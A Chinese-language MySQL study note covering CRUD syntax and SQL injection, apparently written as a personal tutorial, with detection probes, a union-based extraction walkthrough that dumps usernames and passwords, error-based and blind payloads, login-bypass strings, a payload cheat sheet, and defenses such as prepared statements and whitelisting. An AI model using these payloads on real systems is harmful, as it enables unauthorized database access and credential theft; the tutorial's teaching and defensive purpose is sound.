# MySQL 入门笔记：增删改查 + SQL 注入

> **标注说明**：
>
> - SQL 代码里，**自定义的表名、列名等标识符**统一用反引号包裹，如 `` `users` ``、`` `id` ``——这是 MySQL 本身支持的合法语法，专门用来标识"这是我自己起的名字"，和用单引号包的**字符串数据**（如 `'tom'`）区分开。
> - <span style="color:rgb(154, 56, 215)">**紫色**</span> 表示 SQL 内置函数/方法，如 <span style="color:rgb(154, 56, 215)">`VERSION()`</span>。
> - 增删改查四个操作分别用固定颜色标注：#改颜色标注为Markdown语法 正常应使用Markdown工具查看会显示   <span style="color:rgb(69, 176, 118)">**绿色 = 增（INSERT）**</span>　   <span style="color:rgb(222, 60, 54)">**红色 = 删（DELETE）**</span>　   <span style="color:rgb(248, 136, 37)">**橙色 = 改（UPDATE）**</span>　   <span style="color:rgb(41, 114, 244)">**蓝色 = 查（SELECT）**</span>
>
> **目标**：只讲两件事——① 能看懂、会写基本的增删改查（CRUD）语句；② 理解 SQL 注入的原理、怎么测、怎么防。  
> **不涉及**：数据库设计范式、存储过程、性能调优等开发/DBA 向内容。

---

## 目录

1. [基础概念](#1-基础概念)
2. [环境与基本操作](#2-环境与基本操作)
3. [<span style="color:rgb(69, 176, 118)">增：INSERT</span>](#3-增insert)
4. [<span style="color:rgb(222, 60, 54)">删：DELETE</span>](#4-删delete)
5. [<span style="color:rgb(248, 136, 37)">改：UPDATE</span>](#5-改update)
6. [<span style="color:rgb(41, 114, 244)">查：SELECT</span>](#6-查select)
7. [常用函数与运算符](#7-常用函数与运算符)
8. [SQL 注入原理](#8-sql-注入原理)
9. [SQL 注入的分类与判断方法](#9-sql-注入的分类与判断方法)
10. [联合查询注入（Union-based）实战思路](#10-联合查询注入union-based实战思路)
11. [报错注入、布尔盲注、时间盲注](#11-报错注入布尔盲注时间盲注)
12. [其他注入点与进阶场景](#12-其他注入点与进阶场景)
13. [SQL 注入防御](#13-sql-注入防御)
14. [速查表](#14-速查表)
15. [练习建议](#15-练习建议)

---

## 1. 基础概念

| 术语                     | 含义                                                                                                       |
| ---------------------- | -------------------------------------------------------------------------------------------------------- |
| 数据库（Database / Schema） | 一组表的集合，相当于一个"文件夹"                                                                                        |
| 表（Table）               | 存数据的二维结构，由行和列组成                                                                                          |
| 行（Row / Record）        | 一条数据                                                                                                     |
| 列（Column / Field）      | 一个字段，如 `` `id` ``、`` `username` ``                                                                       |
| 主键（Primary Key）        | 唯一标识一行的列，通常是 `` `id` ``。当一个 Primary Key 无法唯一表示表格的数据时，就可以通过设置两个或多个 Primary Key 来标识，如下图 `` `Works_With` `` |
| 外键（Foreign Key）        | 指向另一张表主键的列，用于关联表，对应到另一张表格的 Primary Key，也可以对应到自己的表格                                                       |
| NULL                   | 空值，表示"没有值"，不等于 `0` 或空字符串                                                                                 |


**一张示例表 `` `users` ``**，后续所有例子都基于它：

| id  | username | password  | email         | role  | created_at |
| --- | -------- | --------- | ------------- | ----- | ---------- |
| 1   | alice    | e10adc... | <alice@a.com> | user  | 2026-01-01 |
| 2   | bob      | 5f4dcc... | <bob@a.com>   | admin | 2026-01-02 |

```sql
CREATE TABLE `users` (
    `id` INT PRIMARY KEY AUTO_INCREMENT,
    `username` VARCHAR(50) NOT NULL,
    `password` VARCHAR(100) NOT NULL,
    `email` VARCHAR(100),
    `role` VARCHAR(20) DEFAULT 'user',
    `created_at` DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

> 注意对比：`` `users` ``、`` `id` ``、`` `username` `` 这些是反引号包住的**标识符**（表名/列名，自己取的名字）；而 `'user'` 这种单引号包住的是**字符串数据**（这里是 `` `role` `` 列的默认值）。两者含义完全不同，不要混淆。


- `VARCHAR(50)`：最长 50 字符的可变长字符串。
- `INT`：整数。`DATETIME`：日期时间。
- `AUTO_INCREMENT`：自增，不用手动赋值。
- `NOT NULL`：不允许为空。`DEFAULT`：默认值。


> SQL 语句**不区分大小写**（`SELECT` 和 `select` 一样），但习惯上关键字大写、表名字段名小写，便于阅读。语句以 `;` 结尾。

---

## 2. 环境与基本操作

```sql
-- 查看所有数据库
SHOW DATABASES;

-- 创建并切换数据库
CREATE DATABASE `testdb`;
USE `testdb`;

-- 查看当前库里的表
SHOW TABLES;

-- 查看表结构
DESC `users`;
-- 或
SHOW COLUMNS FROM `users`;

-- 命令行连接（了解即可）
mysql -u root -p -h 127.0.0.1 -P 3306
```

数据库名 `` `testdb` ``、表名 `` `users` `` 都是开发者自己定义的标识符，换成自己的项目时名字可以任意取，这也是它们被反引号包住的原因。

注释写法：

```sql
-- 单行注释（-- 后面要有一个空格）
# 单行注释（MySQL 特有）
/* 多行注释 */
```

> 这三种注释写法在 SQL 注入里非常关键：`#` 和 `-- `（带空格）经常被用来**截断后面的 SQL，让自己构造的语句生效**。

---

## 3. <span style="color:rgb(69, 176, 118)">增：INSERT</span>

```sql
-- 写全部列（顺序要和建表一致）
INSERT INTO `users` VALUES (3, 'tom', '123456', 'tom@a.com', 'user', NOW());

-- 指定列（推荐，更清晰，不用管列顺序）
INSERT INTO `users` (`username`, `password`, `email`) VALUES ('tom', '123456', 'tom@a.com');

-- 一次插入多行
INSERT INTO `users` (`username`, `password`) VALUES
    ('a', '111'),
    ('b', '222'),
    ('c', '333');
```

- `` `users` `` 是表名，`` `username` ``/`` `password` ``/`` `email` `` 是列名，都是反引号标注的自定义标识符；而 `'tom'`、`'123456'`、`'tom@a.com'` 是要插入的实际数据（单引号）。<span style="color:rgb(69, 176, 118)">`INSERT INTO`</span> 是固定语法关键字，不可改。
- <span style="color:rgb(154, 56, 215)">`AUTO_INCREMENT`</span> 和 <span style="color:rgb(154, 56, 215)">`DEFAULT`</span> 修饰的列可以不写（如上面没写 `` `id` `` 和 `` `created_at` ``）。
- 字符串数据用**单引号**，数字不用加引号；标识符用**反引号**。

---

## 4. <span style="color:rgb(222, 60, 54)">删：DELETE</span>

```sql
-- 删除符合条件的行
DELETE FROM `users` WHERE `id` = 3;

-- 删除多条
DELETE FROM `users` WHERE `role` = 'guest';

-- ⚠️ 不写 WHERE 会删除整张表的数据（表结构还在，数据全没）
DELETE FROM `users`;

-- 清空整张表，比 DELETE 快，且重置自增 id（了解即可）
TRUNCATE TABLE `users`;
```

> **安全/操作习惯**：写 <span style="color:rgb(222, 60, 54)">`DELETE`</span> 前，先用相同的 `WHERE` 条件执行一次 <span style="color:rgb(41, 114, 244)">`SELECT`</span>，确认要删的就是表 `` `users` `` 中的这些行，再改成 <span style="color:rgb(222, 60, 54)">`DELETE`</span>。这是最基本也最重要的操作习惯。

---

## 5. <span style="color:rgb(248, 136, 37)">改：UPDATE</span>

```sql
-- 修改一行
UPDATE `users` SET `email` = 'new@a.com' WHERE `id` = 1;

-- 同时改多列
UPDATE `users` SET `role` = 'admin', `email` = 'x@a.com' WHERE `id` = 2;

-- ⚠️ 不写 WHERE 会修改全表所有行
UPDATE `users` SET `role` = 'user';
```

同样的习惯：**先用 <span style="color:rgb(41, 114, 244)">`SELECT`</span> 确认范围，再执行 <span style="color:rgb(248, 136, 37)">`UPDATE`</span>**。这里的 `` `email` ``、`` `role` `` 是表 `` `users` `` 的列名（标识符），而 `'new@a.com'`、`'admin'`、`'user'` 是要写入的数据（字符串）。

---

## 6. <span style="color:rgb(41, 114, 244)">查：SELECT</span>

### 6.1 基本查询

```sql
SELECT * FROM `users`;                                -- 所有列
SELECT `username`, `email` FROM `users`;               -- 指定列
SELECT * FROM `users` WHERE `id` = 1;                   -- 条件
SELECT * FROM `users` WHERE `role` = 'admin';
SELECT * FROM `users` WHERE `id` > 1 AND `role` = 'user';   -- 组合条件
SELECT * FROM `users` WHERE `username` = 'alice' OR `username` = 'bob';
```

### 6.2 常用条件写法

```sql
SELECT * FROM `users` WHERE `id` IN (1, 2, 3);                  -- 在集合中
SELECT * FROM `users` WHERE `id` BETWEEN 1 AND 10;               -- 区间
SELECT * FROM `users` WHERE `username` LIKE 'a%';                 -- 模糊匹配：a 开头
SELECT * FROM `users` WHERE `username` LIKE '%li%';               -- 包含 li
SELECT * FROM `users` WHERE `email` IS NULL;                      -- 为空
SELECT * FROM `users` WHERE `email` IS NOT NULL;                  -- 不为空
SELECT * FROM `users` WHERE `username` != 'alice';                -- 不等于（也可用 <>）
```

<span style="color:rgb(154, 56, 215)">`LIKE`</span> 的通配符：`%` 匹配任意多个字符，`_` 匹配一个字符。注意 `'a%'`、`'%li%'` 这些是带通配符的**字符串数据**，不是标识符，所以用单引号。

### 6.3 排序、去重、分页、聚合

```sql
SELECT * FROM `users` ORDER BY `created_at` DESC;       -- 按时间倒序，ASC 为升序（默认）
SELECT DISTINCT `role` FROM `users`;                     -- 去重
SELECT * FROM `users` LIMIT 10;                          -- 取前 10 条
SELECT * FROM `users` LIMIT 10 OFFSET 20;                -- 跳过 20 条，再取 10 条（常用于分页）

SELECT COUNT(*) FROM `users`;                            -- 总行数
SELECT COUNT(*) FROM `users` WHERE `role` = 'admin';     -- 符合条件的行数
SELECT `role`, COUNT(*) FROM `users` GROUP BY `role`;    -- 按 role 分组统计
SELECT `role`, COUNT(*) AS `cnt` FROM `users` GROUP BY `role` HAVING `cnt` > 1;  -- 分组后再过滤
```

- `WHERE` 是在分组**之前**过滤；`HAVING` 是在分组**之后**过滤（针对聚合结果）。
- <span style="color:rgb(154, 56, 215)">`AS`</span>：起别名，这里 `` `cnt` `` 也是自定义的别名标识符，同样可以反引号包裹，方便阅读。
- <span style="color:rgb(154, 56, 215)">`COUNT()`</span>：统计行数的内置函数。

### 6.4 多表关联（了解即可，渗透测试中用得较少，但读代码会遇到）

```sql
-- 假设还有一张 orders(id, user_id, amount) 表
SELECT `u`.`username`, `o`.`amount`
FROM `users` `u`
JOIN `orders` `o` ON `u`.`id` = `o`.`user_id`;

-- 左连接：即使 orders 没有匹配，也保留 users 的行
SELECT `u`.`username`, `o`.`amount`
FROM `users` `u`
LEFT JOIN `orders` `o` ON `u`.`id` = `o`.`user_id`;
```

`` `orders` ``、`` `user_id` ``/`` `amount` `` 同样是自定义标识符；`` `u` ``、`` `o` `` 是给 `` `users` ``、`` `orders` `` 起的别名，本质也是标识符，所以也用反引号。

---

## 7. 常用函数与运算符

### 7.1 字符串函数

```sql
SELECT CONCAT(`username`, '@', `email`) FROM `users`;      -- 拼接
SELECT LENGTH(`username`) FROM `users`;                     -- 字符串长度
SELECT SUBSTRING(`username`, 1, 3) FROM `users`;            -- 截取：从第1位开始取3个字符
SELECT UPPER(`username`), LOWER(`username`) FROM `users`;   -- 大小写
```

| 函数                                                                                                              | 作用        |
| --------------------------------------------------------------------------------------------------------------- | --------- |
| <span style="color:rgb(154, 56, 215)">`CONCAT()`</span>                                                         | 拼接多个字符串   |
| <span style="color:rgb(154, 56, 215)">`LENGTH()`</span>                                                         | 返回字符串长度   |
| <span style="color:rgb(154, 56, 215)">`SUBSTRING()`</span>                                                      | 截取子字符串    |
| <span style="color:rgb(154, 56, 215)">`UPPER()`</span> / <span style="color:rgb(154, 56, 215)">`LOWER()`</span> | 转大写 / 转小写 |

> 这里 `` `username` ``、`` `email` `` 是作为函数参数传入的列名（标识符），`'@'` 是函数内部用来拼接的字符串字面量——同一行代码里可能既有反引号又有单引号，区分方法就是看它是"你自己起的名字"还是"实打实的数据内容"。

### 7.2 条件判断

```sql
SELECT IF(`role` = 'admin', '管理员', '普通用户') FROM `users`;

SELECT
  CASE
    WHEN `role` = 'admin' THEN '管理员'
    WHEN `role` = 'user' THEN '普通用户'
    ELSE '未知'
  END AS `role_name`
FROM `users`;
```

<span style="color:rgb(154, 56, 215)">`IF()`</span> 和 <span style="color:rgb(154, 56, 215)">`CASE WHEN`</span> 都是条件判断函数/语法，`` `role_name` `` 是自定义的别名标识符。

### 7.3 常用内置信息函数（SQL 注入时高频使用，见第 10 章）

```sql
SELECT VERSION();              -- 数据库版本
SELECT DATABASE();             -- 当前数据库名
SELECT USER();                 -- 当前连接用户
SELECT @@datadir;              -- 数据目录路径
SELECT @@version_compile_os;   -- 操作系统
```

| 函数                                                                  | 作用                            |
| ------------------------------------------------------------------- | ----------------------------- |
| <span style="color:rgb(154, 56, 215)">`VERSION()`</span>            | 数据库版本                         |
| <span style="color:rgb(154, 56, 215)">`DATABASE()`</span>           | 当前数据库名                        |
| <span style="color:rgb(154, 56, 215)">`USER()`</span>               | 当前连接用户                        |
| <span style="color:rgb(154, 56, 215)">`@@datadir`</span>            | 数据目录路径（系统变量，非函数，但同属"内置信息获取"类） |
| <span style="color:rgb(154, 56, 215)">`@@version_compile_os`</span> | 操作系统（系统变量）                    |

> 这几个都是 MySQL **内置函数**，不是你自己定义的表/列，所以不加反引号，只用紫色标注区分"这是函数调用"。

---

## 8. SQL 注入原理

### 8.1 核心原因

程序把**用户输入**直接拼接进 SQL 语句，让用户输入的内容"越权"改变了 SQL 语句本身的结构。

```java
// 伪代码，假设这是后端逻辑
String id = request.getParameter("id");   // 用户传来的参数，比如 ?id=1
String sql = "SELECT * FROM users WHERE id = " + id;
// 正常情况：SELECT * FROM users WHERE id = 1
```

这里的 `id` 是 Java 代码里自定义的变量名（不是 SQL 标识符，所以这段伪代码里没加反引号）；拼出来的 `sql` 字符串如果写成规范 SQL，应该是 ``SELECT * FROM `users` WHERE `id` = 1``。如果用户传 `id=1 OR 1=1`：

```sql
SELECT * FROM `users` WHERE `id` = 1 OR 1=1
```

`1=1` 永远为真，整个 `WHERE` 恒成立，于是**返回了所有用户的数据**，而不是本该只返回 `` `id`=1 `` 这一条。这就是 SQL 注入最基础的例子：**用户输入改变了查询的逻辑结构**。

### 8.2 本质和前面学过的东西是同一个模型

还记得 XSS 的 **Source → Sink** 模型吗？SQL 注入是一样的：

|        | Source（污染源）               | Sink（危险点）                                                                                                              |
| ------ | ------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| XSS    | URL 参数、表单等用户输入            | <span style="color:rgb(154, 56, 215)">`innerHTML`</span>、<span style="color:rgb(154, 56, 215)">`document.write`</span> |
| SQL 注入 | URL 参数、表单、Cookie、请求头等用户输入 | 拼接出的 SQL 语句被 <span style="color:rgb(154, 56, 215)">`execute`</span> 执行                                                 |

**唯一区别**：XSS 逃逸的是 HTML/JS 的语法结构，SQL 注入逃逸的是 SQL 的语法结构。判断思路完全一致：**先看输入落在 SQL 语句的什么位置（字符串里？数字位置？列名位置？），再想怎么闭合/拼接出新的语句。**

### 8.3 数字型 vs 字符型注入

```sql
-- 数字型：参数不带引号，可以直接拼逻辑
SELECT * FROM `users` WHERE `id` = 1 OR 1=1

-- 字符型：参数被单引号包住，必须先闭合引号
SELECT * FROM `users` WHERE `username` = 'alice' OR '1'='1'
-- 原句: ... WHERE `username` = '{输入}'
-- 输入: alice' OR '1'='1
```

闭合引号后面常用注释符把原语句剩下的部分"吃掉"：

```sql
SELECT * FROM `users` WHERE `username` = 'admin'-- ' AND `password` = '123'
-- 输入 username = admin'-- 
-- 效果：password 那部分被注释掉，相当于直接按 username='admin' 查询，无需密码
```

> MySQL 里 `-- ` 后面必须跟一个空格（或用 `#` 不需要空格）才会被当注释，这是常见的坑。

---

## 9. SQL 注入的分类与判断方法

### 9.1 按数据返回方式分类

| 类型                            | 特点                                                                                               |
| ----------------------------- | ------------------------------------------------------------------------------------------------ |
| **联合查询注入（Union-based）**       | 页面直接把查询结果显示出来，可以用 <span style="color:rgb(41, 114, 244)">`UNION SELECT`</span> 把想要的数据拼进正常结果里      |
| **报错注入（Error-based）**         | 页面本身不回显数据，但会把数据库报错信息显示出来，利用报错函数把数据"带出来"                                                          |
| **布尔盲注（Boolean-based Blind）** | 页面不回显数据也不报错，但条件为真/假时页面表现不同（比如有无数据、页面文案不同）                                                        |
| **时间盲注（Time-based Blind）**    | 页面对真假没有任何可见差异，只能通过**让数据库延迟执行**（如 <span style="color:rgb(154, 56, 215)">`SLEEP(5)`</span>）来判断条件真假 |
| **堆叠注入（Stacked Queries）**     | 一次性执行多条用 `;` 分隔的语句（不是所有环境都支持，取决于驱动/框架）                                                           |
| **带外注入（Out-of-band，OOB）**     | 利用数据库发起 DNS/HTTP 请求把数据带到攻击者可控的服务器（了解即可，场景较少）                                                     |
|                               |                                                                                                  |

### 9.2 判断是否存在注入的基本测试（授权环境下）

对参数（如 `?id=1`）依次尝试：

```
id=1'                 → 看是否报错或页面异常（最基础的探测）
id=1''                → 两个单引号，若恢复正常，说明是字符型且单引号被直接拼接
id=1 and 1=1           → 页面应和 id=1 正常时一样
id=1 and 1=2           → 页面应变化（数据变少/报错/文案不同）—— 和上面对比即可判断是否存在注入
id=1 or 1=1             → 可能返回全部数据
id=1;sleep(3)        （如有堆叠）或 id=1 and sleep(3)  → 响应明显延迟，说明存在注入（时间盲注的判断方法）
```

**核心思路**：构造**让条件为真**和**让条件为假**的两次请求，对比页面的返回内容、返回条数、响应时间是否有差异。有差异，就说明输入影响了 SQL 逻辑，存在注入点。

---

## 10. 联合查询注入（Union-based）实战思路

这是最直观、最常用来理解原理的一类，完整流程如下（授权环境/靶场中练习）：

### 第一步：判断字段数

用 <span style="color:rgb(154, 56, 215)">`ORDER BY`</span> 递增测试，直到报错为止：

```
?id=1 order by 1   -- 正常
?id=1 order by 2   -- 正常
?id=1 order by 3   -- 正常
?id=1 order by 4   -- 报错 → 说明原查询是 3 列
```

### 第二步：确定回显位置

用 <span style="color:rgb(41, 114, 244)">`UNION SELECT`</span> 插入和列数相同的占位数字，看页面上哪个数字被显示出来：

```sql
-- 原查询返回不存在的 id（如 -1 或 0），这样原查询没数据，才能显示 UNION 的结果
?id=-1 union select 1,2,3
-- 不从数据表取数据，直接输出常量值，相当于临时造一行结果。
```

页面显示了 `2`，说明第 2 列的位置会被输出到页面上，之后就把想查的数据放在这个位置。

### 第三步：获取数据库基本信息

```sql
?id=-1 union select 1,version(),database()
?id=-1 union select 1,user(),@@version_compile_os #这里第3列可以随便填
```

这里的 <span style="color:rgb(154, 56, 215)">`version()`</span>、<span style="color:rgb(154, 56, 215)">`database()`</span>、<span style="color:rgb(154, 56, 215)">`user()`</span> 都是第 7.3 节介绍过的内置函数，不是标识符，不加反引号。

### 第四步：获取库名、表名、列名（信息型数据库 `` `information_schema` ``）

MySQL 自带一个叫 `` `information_schema` `` 的库，记录了所有数据库、表、列的元信息，这是注入时"摸清结构"的关键：

```sql
-- 所有数据库名
?id=-1 union select 1,group_concat(`schema_name`),3 from `information_schema`.`schemata`

-- 当前库下所有表名 **`table_schema`**：这是 `information_schema.tables` 表里的一个列名。它代表**“这张表属于哪个数据库”**
?id=-1 union select 1,group_concat(`table_name`),3 from `information_schema`.`tables` where `table_schema`=database()

-- 某张表的所有列名
?id=-1 union select 1,group_concat(`column_name`),3 from `information_schema`.`columns` where `table_name`='users'
```

- <span style="color:rgb(154, 56, 215)">`GROUP_CONCAT()`</span>：把多行结果拼成一行用逗号分隔的字符串，方便在一个位置里把一堆结果都显示出来。
- <span style="color:rgb(154, 56, 215)">`database()`</span>：当前数据库名，避免再手动输入一次。
- `` `schema_name` ``、`` `table_name` ``、`` `column_name` ``、`` `table_schema` `` 都是 `` `information_schema` `` 这个系统库里**固定存在**的列名（虽不是你自己建表时取的名字，但本质上仍是标识符，所以同样用反引号）；而 `'users'` 这里是作为筛选条件的**字符串数据**，要找的表名字符串，所以用单引号。

### 第五步：获取数据

```sql
?id=-1 union select 1,group_concat(`username`,0x3a,`password`),3 from `users`
```

`0x3a` 是十六进制表示的冒号 `:`，用来在拼接时分隔 `` `username` `` 和 `` `password` `` 两列的值，避免冲突单引号。

---

## 11. 报错注入、布尔盲注、时间盲注

### 11.1 报错注入

利用某些函数在执行时会把查询结果拼进报错信息里，适合页面只显示数据库报错、不显示正常数据的场景。

```sql
-- 经典函数之一：updatexml()，第二个参数解析异常时会把内容带进报错里
SELECT updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1);
-- 报错信息里会包含当前数据库名
```

```sql
-- 另一个常用：extractvalue()
SELECT extractvalue(1, concat(0x7e, (SELECT user())));
```

| 函数                                                            | 作用                                                                                                         |
| ------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| <span style="color:rgb(154, 56, 215)">`updatexml()`</span>    | 第二参数格式不合法时，会把该参数内容带进报错信息      标准语法： updatexml(目标XML文档, 要修改的节点路径(XPath), 要替换成的新内容)  原本是用来修改 XML 文档里某个节点内容的。 |
| <span style="color:rgb(154, 56, 215)">`extractvalue()`</span> | 原理类似，同样利用参数解析报错回显数据                                                                                        |
| <span style="color:rgb(154, 56, 215)">`concat()`</span>       | 拼接字符串，这里用于拼出会触发报错的格式                                                                                       |

读法：不需要记住原理细节，只要知道**这类函数的设计缺陷会把子查询的结果"打印"进报错信息**，攻击者就是利用这一点把想要的数据"带出来"。

### 11.2 布尔盲注

页面不报错也不回显数据，但是**条件为真/假时页面有细微差异**（比如有结果 vs 无结果，或者某段文字出不出现）。

```sql
-- 猜测数据库名第一个字符
?id=1 and substring(database(),1,1)='a'
-- 为真 → 页面和正常一样
-- 为假 → 页面变化（无数据/提示不同）
```

通过不断改变猜测的字符，**逐字符**把数据库名、表名、字段值都猜出来。实战中会用脚本自动化遍历字符（a-z、0-9 等）和位置，效率很低但适用面广。

### 11.3 时间盲注

页面**连真假都看不出差异**时，只能靠数据库执行时间的变化来判断：

```sql
?id=1 and if(substring(database(),1,1)='a', sleep(3), 0)
-- 猜对：响应慢 3 秒
-- 猜错：响应正常
```

- <span style="color:rgb(154, 56, 215)">`IF(条件, 真值, 假值)`</span>：条件判断函数。
- <span style="color:rgb(154, 56, 215)">`SLEEP(秒数)`</span>：让数据库暂停执行指定秒数。

### 11.4 三种盲注/报错注入的对比记忆

| 类型   | 页面能看到什么      | 判断方式        |
| ---- | ------------ | ----------- |
| 报错注入 | 数据库报错信息      | 直接读报错里的数据   |
| 布尔盲注 | 页面内容/状态的真假差异 | 对比真假两种请求的响应 |
| 时间盲注 | 什么差异都看不到     | 对比响应时间      |

---

## 12. 其他注入点与进阶场景

| 场景                       | 说明                                                                                                                                                                                                                     |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **二次注入**                 | 恶意数据先被安全地存进数据库（如用 `?` 占位插入），但之后**被取出来又拼接进了另一条 SQL**，在"第二次使用"时才触发注入                                                                                                                                                     |
| **Cookie / Header 注入**   | 注入点不止是 URL 参数，`User-Agent`、`Referer`、`X-Forwarded-For`、Cookie 值等只要被拼进 SQL 都可能存在注入                                                                                                                                      |
| **登录绕过**                 | 经典场景：`` `username`='admin' AND `password`='{输入}' ``，输入 `' OR '1'='1` 直接绕过密码校验                                                                                                                                          |
| **宽字节注入**                | 针对某些 GBK 编码环境下转义被"吃掉"的绕过技巧（了解即可，现代项目已少见）                                                                                                                                                                               |
| **ORDER BY / 表名列名位置的注入** | 这些位置无法用占位符预编译（见第 13 章），只能做白名单校验，是实际项目里容易被忽略的注入点                                                                                                                                                                        |
| **堆叠注入**                 | 如果执行环境允许一次执行多条语句（`;` 分隔），可以执行 <span style="color:rgb(69, 176, 118)">`INSERT`</span>/<span style="color:rgb(248, 136, 37)">`UPDATE`</span>/`DROP` 等任意语句，危害远大于 <span style="color:rgb(41, 114, 244)">`SELECT`</span> 型注入 |
| **WAF 绕过**               | 大小写混合、内联注释 `/*!50000select*/`、编码、拆分关键字等（仅用于授权测试中理解防护机制，不展开讲具体 payload）                                                                                                                                                 |

---

## 13. SQL 注入防御

### 13.1 核心方法：预编译语句（Prepared Statement / 参数化查询）

**原理**：把 SQL 语句的"结构"和"数据"分开发送给数据库，数据库预先编译好语句结构，之后传入的参数**只会被当作数据，不会被当成 SQL 语法的一部分**，因此无法改变语句结构。

```java
// Java 示例（对应之前 Java 笔记里的第 14.3 节）
PreparedStatement ps = conn.prepareStatement("SELECT * FROM `users` WHERE `username` = ? AND `password` = ?");
ps.setString(1, username);
ps.setString(2, password);
```

```python
# Python 示例
cursor.execute("SELECT * FROM `users` WHERE `username` = %s AND `password` = %s", (username, password))
```

```sql
-- MyBatis（对应之前 Java 笔记第 14.4 节）
-- 安全：#{} 预编译
select * from `users` where `username` = #{username}
-- 危险：${} 字符串拼接
select * from `users` where `username` = '${username}'
```

这里的 <span style="color:rgb(154, 56, 215)">`prepareStatement()`</span>、<span style="color:rgb(154, 56, 215)">`setString()`</span>、<span style="color:rgb(154, 56, 215)">`execute()`</span>（Python 中的 `cursor.execute()`）都是各语言/框架提供的方法；SQL 字符串里的 `` `users` ``、`` `username` ``、`` `password` `` 是标识符，而 `?`/`%s`/`#{username}` 是参数占位符，并非字符串数据，所以不加引号。

> **这是最根本、最该优先使用的防御方式，没有之一。**

### 13.2 预编译无法覆盖的位置：白名单校验

表名、列名、<span style="color:rgb(154, 56, 215)">`ORDER BY`</span> 后面排序的列名/方向，这些位置**无法用参数化**（因为它们是 SQL 结构的一部分，不是数据），只能用白名单：

```java
// 伪代码
String[] allowedColumns = {"id", "username", "created_at"};
if (!Arrays.asList(allowedColumns).contains(sortField)) {
    sortField = "id";    // 不在白名单里就用默认值，拒绝用户传入的任意内容
}
```

`allowedColumns`、`sortField` 是 Java 代码里的自定义变量名（Java 变量不用反引号，反引号是 SQL 语法），<span style="color:rgb(154, 56, 215)">`Arrays.asList()`</span>、<span style="color:rgb(154, 56, 215)">`.contains()`</span> 是 Java 内置方法。

### 13.3 其他辅助手段（不能替代预编译，只能作为纵深防御）

| 手段             | 说明                                                                                     |
| -------------- | -------------------------------------------------------------------------------------- |
| 输入校验           | 按业务含义限制输入格式（如 `` `id` `` 只能是数字），但不能当作唯一防线                                              |
| 最小权限原则         | 应用连接数据库用的账号**只给必要的权限**（比如不给 `DROP`、`FILE` 权限），即使被注入也能限制危害范围                            |
| 关闭详细报错回显       | 不把数据库报错堆栈直接返回给前端，减少报错注入和信息泄露的机会                                                        |
| WAF（Web 应用防火墙） | 作为补充层拦截常见攻击特征，但**可被绕过，不能替代代码层修复**                                                      |
| ORM 框架         | 如 MyBatis、Hibernate、SQLAlchemy 等，默认写法大多数是参数化的，但要注意框架里"拼字符串"的那些口子（如前面提到的 MyBatis `${}`） |

### 13.4 一句话总结

> **凡是能用预编译/参数化解决的地方，必须用预编译；预编译解决不了的地方（表名、列名、排序方向），必须用白名单。**

---

## 14. 速查表

### 14.1 CRUD 速查（按颜色对应操作）

| 操作                                                 | 语句模板                                                                                                                  |
| -------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| <span style="color:rgb(69, 176, 118)">**增**</span> | <span style="color:rgb(69, 176, 118)">`INSERT INTO`</span> `` `表名` `` (`` `列1` ``,`` `列2` ``) VALUES (值1,值2);         |
| <span style="color:rgb(222, 60, 54)">**删**</span>  | <span style="color:rgb(222, 60, 54)">`DELETE FROM`</span> `` `表名` `` WHERE 条件;                                        |
| <span style="color:rgb(248, 136, 37)">**改**</span> | <span style="color:rgb(248, 136, 37)">`UPDATE`</span> `` `表名` `` SET `` `列` `` =值 WHERE 条件;                           |
| <span style="color:rgb(41, 114, 244)">**查**</span> | <span style="color:rgb(41, 114, 244)">`SELECT`</span> `` `列` `` FROM `` `表名` `` WHERE 条件 ORDER BY `` `列` `` LIMIT 数量; |

### 14.2 SQL 注入信息收集常用语句

| 目的     | 语句                                                                                                                    |
| ------ | --------------------------------------------------------------------------------------------------------------------- |
| 数据库版本  | <span style="color:rgb(154, 56, 215)">`version()`</span>                                                              |
| 当前库名   | <span style="color:rgb(154, 56, 215)">`database()`</span>                                                             |
| 当前用户   | <span style="color:rgb(154, 56, 215)">`user()`</span> / <span style="color:rgb(154, 56, 215)">`current_user()`</span> |
| 所有库名   | `` select `schema_name` from `information_schema`.`schemata` ``                                                       |
| 当前库所有表 | ``select `table_name` from `information_schema`.`tables` where `table_schema`=database()``                            |
| 某表所有列  | ``select `column_name` from `information_schema`.`columns` where `table_name`='xxx'``                                 |
| 多行拼一行  | <span style="color:rgb(154, 56, 215)">`group_concat(列名)`</span>                                                       |
| 拼接字符串  | <span style="color:rgb(154, 56, 215)">`concat(a, 0x3a, b)`</span>                                                     |

### 14.3 注入判断常用 payload（授权环境测试用）

```
'
''
 and 1=1
 and 1=2
 order by N
 union select ...
 and sleep(3)
 and if(条件,sleep(3),0)
 -- （后面带空格）
 #
```

### 14.4 常用报错注入函数

```
updatexml(1,concat(0x7e,(子查询),0x7e),1)
extractvalue(1,concat(0x7e,(子查询)))
```

---

## 15. 练习建议

### 15.1 学习顺序

1. 先用一个本地 MySQL（或在线 SQL 练习网站）把第 3~6 章的 <span style="color:rgb(69, 176, 118)">增</span>/<span style="color:rgb(222, 60, 54)">删</span>/<span style="color:rgb(248, 136, 37)">改</span>/<span style="color:rgb(41, 114, 244)">查</span> 全部手敲一遍，直到不用查笔记也能写出基本语句。
2. 读第 8~9 章，理解"拼接字符串导致语句结构被改变"这个核心原理，**不要求能背 payload，要求能解释原理**。
3. 在授权靶场里，照着第 10 章的五个步骤，完整走一遍联合查询注入的全过程。
4. 再做几道布尔盲注、时间盲注的靶场题，体会"看不到数据，只能靠真假/时间差异判断"的思路。
5. 读第 13 章，回头对照你写过的任何一行拼字符串的 SQL（包括之前 Java 笔记里的例子），自己改写成预编译版本。

### 15.2 推荐练习平台（英文 / 国际）

- **PortSwigger Web Security Academy** 的 SQL Injection 专题：从基础到盲注、二次注入都有，且有在线靶场，边做边讲原理。
- **SQLZOO**：专门练 SQL 语法（增删改查、多表查询）的互动网站，适合先把 SQL 本身练熟。
- **OWASP Juice Shop / WebGoat**：综合靶场，包含 SQL 注入关卡。
- **TryHackMe**：有专门的 SQL Injection 入门房间，步骤引导式。
- **HackTricks** 的 SQL Injection 章节：速查各种数据库（MySQL/MSSQL/Oracle/PostgreSQL）的注入语法差异，适合后期查阅。

### 15.3 自检清单

